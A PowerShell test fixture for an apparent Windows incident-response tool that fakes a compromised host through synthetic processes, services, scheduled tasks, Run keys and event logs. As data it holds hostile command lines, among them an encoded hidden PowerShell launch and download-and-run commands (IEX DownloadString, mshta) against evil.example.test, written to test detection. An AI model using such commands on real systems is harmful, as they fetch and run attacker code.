# Synthetic Windows data sources used by the tests, the demo and the sample-data generator.
# Everything here is invented: documentation-range IPs (RFC 5737), *.example.test domains, a harmless text file
# standing in for malware. Nothing touches the real system.

$global:FakeStandInBytes = [Text.Encoding]::ASCII.GetBytes("SYNTHETIC TEST FILE - NOT A REAL BINARY - safe to delete`n")
$global:FakeStandInSha256 = ([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($global:FakeStandInBytes)).Replace('-', '').ToLowerInvariant())
$global:FakeNow = [DateTime]::SpecifyKind([DateTime]'2026-03-10T12:00:00', 'Utc')

function global:Get-FakeStandInSha256 { return $global:FakeStandInSha256 }
function global:Get-FakeNow { return $global:FakeNow }

function global:Install-IRFakeSource {
    <#
    .SYNOPSIS
        Replaces the module's raw data sources with synthetic ones (module scope). Use -Baseline for the 'known good' state.
        Individual sources can be overridden afterwards with Set-IRFakeOverride.
    #>
    param([Parameter(Mandatory)] $Module, [switch]$Baseline, [switch]$Elevated)
    & $Module {
        param($baseline, $elevated, $standIn)
        $script:Fake = @{ Baseline = $baseline; Elevated = $elevated; StandIn = $standIn }
        $script:FakeRecord = 1000
        $script:FakeT = { param($s) [DateTime]::SpecifyKind([DateTime]$s, 'Utc') }
        Set-Item Function:script:Test-IRElevated { return $script:Fake.Elevated }
        Set-Item Function:script:Get-IRRawOperatingSystem {
            [pscustomobject]@{ Caption = 'Microsoft Windows 11 Pro (synthetic)'; Version = '10.0.22631'; BuildNumber = '22631'; Architecture = '64-bit'
                LastBootUpTime = [DateTime]::SpecifyKind([DateTime]'2026-03-09T08:00:00', 'Utc'); LocalDateTime = '2026-03-10T14:00:00+02:00'; TimeZone = '(UTC+02:00) Synthetic Standard Time'; TimeZoneOffsetMinutes = 120; ProductType = 1 }
        }
        Set-Item Function:script:Get-IRRawComputerSystem { [pscustomobject]@{ Name = 'SYNTH-WS01'; Domain = 'WORKGROUP'; PartOfDomain = $false; Manufacturer = 'Synthetic'; Model = 'Test VM' } }
        Set-Item Function:script:Get-IRRawSecurityProduct { [pscustomobject]@{ Name = 'Windows Defender (synthetic)'; ProductState = 397568; Path = 'C:\Program Files\Windows Defender\MsMpEng.exe' } }
        Set-Item Function:script:Get-IRRawDefender { [pscustomobject]@{ AMServiceEnabled = $true; AntivirusEnabled = $true; RealTimeProtectionEnabled = $true; AntivirusSignatureLastUpdated = [DateTime]::SpecifyKind([DateTime]'2026-03-10T03:00:00', 'Utc'); IsTamperProtected = $true } }
        Set-Item Function:script:Get-IRRawFirewallProfile { 'Domain', 'Private', 'Public' | ForEach-Object { [pscustomobject]@{ Name = $_; Enabled = ($_ -ne 'Public') } } }
        Set-Item Function:script:Get-IRRawRegistryValue {
            param($Path, $Name)
            if ($Name -eq 'EnableLUA') { return 1 }
            if ($Name -eq 'Shell') { return 'explorer.exe' }
            if ($Name -eq 'Userinit') { return 'C:\Windows\system32\userinit.exe,' }
            throw [Management.Automation.ItemNotFoundException]::new("Property $Name does not exist at path $Path.")
        }
        Set-Item Function:script:Test-IRPathExists {
            param($Path)
            $missing = @('c:\program files\acme backup\backup.exe')
            if ($Path.ToLowerInvariant() -in $missing) { return $false }
            return ($Path -match '^[A-Za-z]:\\')
        }
        Set-Item Function:script:Get-IRRawFileHash {
            param($Path, $MaxBytes)
            if ($Path -like '*updater.exe') { return $script:Fake.StandIn }
            if ($Path -like '*secret_locked.sys') { throw 'Access to the path is denied.' }
            $h = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("synthetic:" + $Path.ToLowerInvariant()))
            return ([BitConverter]::ToString($h).Replace('-', '').ToLowerInvariant())
        }
        Set-Item Function:script:Get-IRRawSignature {
            param($Path)
            if ($Path -like '*\Temp\*') { return [pscustomobject]@{ Status = 'NotSigned'; SignerSubject = $null; SignerThumbprint = $null } }
            [pscustomobject]@{ Status = 'Valid'; SignerSubject = 'CN=Synthetic Software Corp'; SignerThumbprint = 'AAAA' }
        }
        $script:FakeProc = {
            param($id, $ppid, $name, $path, $cmd, $start)
            [pscustomobject]@{ ProcessId = $id; ParentProcessId = $ppid; Name = $name; ExecutablePath = $path; CommandLine = $cmd; CreationDate = (& $script:FakeT $start); SessionId = 1 }
        }
        Set-Item Function:script:Get-IRRawProcess {
            & $script:FakeProc 4 0 'System' $null $null '2026-03-09T08:00:00'
            & $script:FakeProc 600 4 'smss.exe' 'C:\Windows\System32\smss.exe' 'smss.exe' '2026-03-09T08:00:01'
            & $script:FakeProc 2100 600 'explorer.exe' 'C:\Windows\explorer.exe' 'C:\Windows\explorer.exe' '2026-03-09T08:05:00'
            & $script:FakeProc 4100 2100 'WINWORD.EXE' 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE' '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\analyst\Documents\invoice.docx"' '2026-03-10T09:00:00'
            if (-not $script:Fake.Baseline) {
                & $script:FakeProc 4200 4100 'cmd.exe' 'C:\Windows\System32\cmd.exe' 'cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' '2026-03-10T09:00:05'
                & $script:FakeProc 4300 4200 'powershell.exe' 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' '2026-03-10T09:00:06'
                & $script:FakeProc 4400 2100 'updater.exe' 'C:\Users\analyst\AppData\Local\Temp\updater.exe' 'updater.exe --server evil.example.test --password hunter2-synthetic' '2026-03-10T09:01:00'
            }
            & $script:FakeProc 4500 2100 'notepad.exe' 'C:\Windows\System32\notepad.exe' 'notepad.exe' '2026-03-10T09:30:00'
            & $script:FakeProc 4600 4 'locked.exe' $null $null '2026-03-10T09:31:00'
        }
        Set-Item Function:script:Get-IRRawProcessOwner {
            param($ProcessId)
            if ($ProcessId -eq 4600) { throw 'Access is denied.' }
            if ($ProcessId -lt 700) { return [pscustomobject]@{ User = 'SYSTEM'; Domain = 'NT AUTHORITY' } }
            [pscustomobject]@{ User = 'analyst'; Domain = 'SYNTH-WS01' }
        }
        Set-Item Function:script:Get-IRRawTcpConnection {
            [pscustomobject]@{ State = 'Listen'; LocalAddress = '0.0.0.0'; LocalPort = 445; RemoteAddress = '0.0.0.0'; RemotePort = 0; OwningProcess = 4 }
            if (-not $script:Fake.Baseline) {
                [pscustomobject]@{ State = 'Listen'; LocalAddress = '0.0.0.0'; LocalPort = 4444; RemoteAddress = '0.0.0.0'; RemotePort = 0; OwningProcess = 4400 }
                [pscustomobject]@{ State = 'Established'; LocalAddress = '10.0.0.5'; LocalPort = 51234; RemoteAddress = '203.0.113.50'; RemotePort = 443; OwningProcess = 4400 }
            }
            [pscustomobject]@{ State = 'Established'; LocalAddress = '10.0.0.5'; LocalPort = 50111; RemoteAddress = '198.51.100.20'; RemotePort = 443; OwningProcess = 2100 }
        }
        Set-Item Function:script:Get-IRRawUdpEndpoint { [pscustomobject]@{ LocalAddress = '0.0.0.0'; LocalPort = 5353; OwningProcess = 2100 } }
        Set-Item Function:script:Get-IRRawLocalUser {
            [pscustomobject]@{ Name = 'Administrator'; Enabled = $false; LastLogon = $null; PasswordLastSet = (& $script:FakeT '2025-01-01T00:00:00'); PasswordRequired = $true; SID = 'S-1-5-21-1-1-1-500' }
            [pscustomobject]@{ Name = 'analyst'; Enabled = $true; LastLogon = (& $script:FakeT '2026-03-10T08:30:00'); PasswordLastSet = (& $script:FakeT '2025-06-01T00:00:00'); PasswordRequired = $true; SID = 'S-1-5-21-1-1-1-1001' }
            [pscustomobject]@{ Name = 'svc_backup'; Enabled = $true; LastLogon = $null; PasswordLastSet = $null; PasswordRequired = $false; SID = 'S-1-5-21-1-1-1-1002' }
        }
        Set-Item Function:script:Get-IRRawLocalGroupMember {
            param($Group)
            if ($Group -eq 'Administrators') {
                [pscustomobject]@{ Name = 'SYNTH-WS01\Administrator'; ObjectClass = 'User'; SID = 'S-1-5-21-1-1-1-500' }
                [pscustomobject]@{ Name = 'SYNTH-WS01\analyst'; ObjectClass = 'User'; SID = 'S-1-5-21-1-1-1-1001' }
                if (-not $script:Fake.Baseline) { [pscustomobject]@{ Name = 'SYNTH-WS01\svc_backup'; ObjectClass = 'User'; SID = 'S-1-5-21-1-1-1-1002' } }
            }
        }
        Set-Item Function:script:Get-IRRawLogonSession { [pscustomobject]@{ LogonId = '0x3e7'; LogonType = 0; StartTime = (& $script:FakeT '2026-03-09T08:00:10'); AuthenticationPackage = 'Negotiate'; User = 'SYSTEM'; Domain = 'NT AUTHORITY' }; [pscustomobject]@{ LogonId = '0x1a2b3'; LogonType = 2; StartTime = (& $script:FakeT '2026-03-10T08:30:00'); AuthenticationPackage = 'Kerberos'; User = 'analyst'; Domain = 'SYNTH-WS01' } }
        Set-Item Function:script:Get-IRRawService {
            [pscustomobject]@{ Name = 'Spooler'; DisplayName = 'Print Spooler'; PathName = 'C:\Windows\System32\spoolsv.exe'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
            [pscustomobject]@{ Name = 'AcmeBackup'; DisplayName = 'Acme Backup'; PathName = 'C:\Program Files\Acme Backup\backup.exe -service'; StartMode = 'Auto'; State = 'Stopped'; StartName = 'LocalSystem' }
            if (-not $script:Fake.Baseline) { [pscustomobject]@{ Name = 'WinUpdateHelper'; DisplayName = 'Windows Update Helper'; PathName = '"C:\Users\analyst\AppData\Local\Temp\updater.exe" --service'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' } }
        }
        Set-Item Function:script:Get-IRRawScheduledTask {
            [pscustomobject]@{ TaskName = 'GoogleUpdate'; TaskPath = '\'; State = 'Ready'; Author = 'Synthetic'; UserId = 'SYSTEM'; RunLevel = 'Highest'; Hidden = $false; LastRunTime = (& $script:FakeT '2026-03-10T06:00:00'); NextRunTime = (& $script:FakeT '2026-03-10T18:00:00'); Actions = @([pscustomobject]@{ Execute = 'C:\Program Files\Synthetic\update.exe'; Arguments = '/ua'; WorkingDirectory = $null }) }
            if (-not $script:Fake.Baseline) {
                [pscustomobject]@{ TaskName = 'SystemHealthCheck'; TaskPath = '\Microsoft\'; State = 'Ready'; Author = 'analyst'; UserId = 'SYSTEM'; RunLevel = 'Highest'; Hidden = $true; LastRunTime = (& $script:FakeT '2026-03-10T10:00:00'); NextRunTime = (& $script:FakeT '2026-03-10T11:00:00'); Actions = @([pscustomobject]@{ Execute = 'powershell.exe'; Arguments = '-NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'; WorkingDirectory = $null }) }
            }
        }
        Set-Item Function:script:Get-IRRawStartupCommand { [pscustomobject]@{ Name = 'SecurityHealth'; Command = '%windir%\system32\SecurityHealthSystray.exe'; Location = 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; User = 'Public' } }
        Set-Item Function:script:Get-IRRawStartupFolderItem {
            if (-not $script:Fake.Baseline) { [pscustomobject]@{ Folder = 'C:\Users\analyst\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'; Name = 'helper.lnk'; FullName = 'C:\Users\analyst\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\helper.lnk'; Length = 1024; LastWriteTimeUtc = (& $script:FakeT '2026-03-10T09:02:00') } }
        }
        Set-Item Function:script:Get-IRRawRegistryRunValue {
            [pscustomobject]@{ Key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; Name = 'SecurityHealth'; Value = '%windir%\system32\SecurityHealthSystray.exe' }
            if (-not $script:Fake.Baseline) {
                [pscustomobject]@{ Key = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; Name = 'Updater'; Value = '"C:\Users\analyst\AppData\Local\Temp\updater.exe" --silent' }
                [pscustomobject]@{ Key = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; Name = 'Loader'; Value = 'mshta.exe http://evil.example.test/a.hta' }
            }
        }
        Set-Item Function:script:Get-IRRawWmiSubscription {
            if (-not $script:Fake.Baseline) {
                [pscustomobject]@{ Kind = 'Filter'; Name = 'SysFilter'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"; ConsumerType = $null; Command = $null; ScriptText = $null; Filter = $null; Consumer = $null }
                [pscustomobject]@{ Kind = 'Consumer'; Name = 'SysConsumer'; Query = $null; ConsumerType = 'CommandLineEventConsumer'; Command = 'cmd.exe /c C:\Users\Public\x.exe --token abc123synthetic'; ScriptText = $null; Filter = $null; Consumer = $null }
            }
        }
        $script:FakeEv = {
            param($ts, $id, $log, $data)
            [pscustomobject]@{ TimeCreatedUtc = (& $script:FakeT $ts); Id = $id; ProviderName = 'Synthetic'; LogName = $log; MachineName = 'SYNTH-WS01'; RecordId = [long](++$script:FakeRecord); Level = 'Information'; Data = $data }
        }
        Set-Item Function:script:Get-IRRawWinEvent {
            param($LogName, $Id, $Since, $MaxEvents)
            Get-IRFakeEventSet $LogName | Where-Object { $_.TimeCreatedUtc -ge $Since -and (-not $Id -or $Id -contains $_.Id) }
        }
        Set-Item Function:script:Get-IRFakeEventSet {
            param($LogName)
            if ($LogName -eq 'Microsoft-Windows-Sysmon/Operational') { throw 'The specified channel could not be found.' }
            if ($LogName -eq 'Security' -and -not $script:Fake.Elevated -and $script:Fake.Contains('DenySecurity')) { throw 'Attempted to perform an unauthorized operation.' }
            if ($LogName -eq 'Security') {
                for ($i = 0; $i -lt 12; $i++) {
                    & $script:FakeEv ("2026-03-10T11:{0:00}:{1:00}" -f (40 + [int]($i / 2)), (($i * 7) % 60)) 4625 'Security' @{ TargetUserName = 'admin'; TargetDomainName = 'SYNTH-WS01'; LogonType = '3'; IpAddress = '203.0.113.50'; WorkstationName = 'ATTACKER'; Status = '0xc000006d'; SubStatus = '0xc000006a' }
                }
                & $script:FakeEv '2026-03-10T11:50:30' 4624 'Security' @{ TargetUserName = 'svc_backup'; TargetDomainName = 'SYNTH-WS01'; LogonType = '10'; IpAddress = '203.0.113.50'; WorkstationName = 'ATTACKER'; ProcessName = 'C:\Windows\System32\svchost.exe' }
                & $script:FakeEv '2026-03-10T11:51:00' 4720 'Security' @{ TargetUserName = 'svc_backup'; SubjectUserName = 'analyst' }
                & $script:FakeEv '2026-03-10T11:51:30' 4732 'Security' @{ TargetUserName = 'Administrators'; MemberName = 'CN=svc_backup'; MemberSid = 'S-1-5-21-1-1-1-1002'; SubjectUserName = 'analyst' }
                & $script:FakeEv '2026-03-10T11:58:00' 1102 'Security' @{ SubjectUserName = 'analyst' }
                & $script:FakeEv '2025-12-01T00:00:00' 4625 'Security' @{ TargetUserName = 'old'; IpAddress = '192.0.2.9' }
            }
            if ($LogName -eq 'System') { & $script:FakeEv '2026-03-10T09:02:00' 7045 'System' @{ ServiceName = 'WinUpdateHelper'; ImagePath = '"C:\Users\analyst\AppData\Local\Temp\updater.exe" --service password=hunter2-synthetic'; ServiceType = 'user mode service'; StartType = 'auto start'; AccountName = 'LocalSystem' } }
            if ($LogName -eq 'Microsoft-Windows-PowerShell/Operational') { & $script:FakeEv '2026-03-10T09:00:10' 4104 'Microsoft-Windows-PowerShell/Operational' @{ Path = ''; ScriptBlockText = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.test/p.ps1')" } }
        }
    } $Baseline.IsPresent $Elevated.IsPresent $global:FakeStandInSha256
}

function global:Set-IRFakeOverride {
    <#
    .SYNOPSIS
        Overrides one module-scope function (for example to simulate a failing source) from a script block.
    #>
    param([Parameter(Mandatory)] $Module, [Parameter(Mandatory)][string]$Name, [Parameter(Mandatory)][scriptblock]$Body)
    & $Module { param($n, $b) Set-Item -Path ("Function:script:" + $n) -Value $b } $Name $Body
}
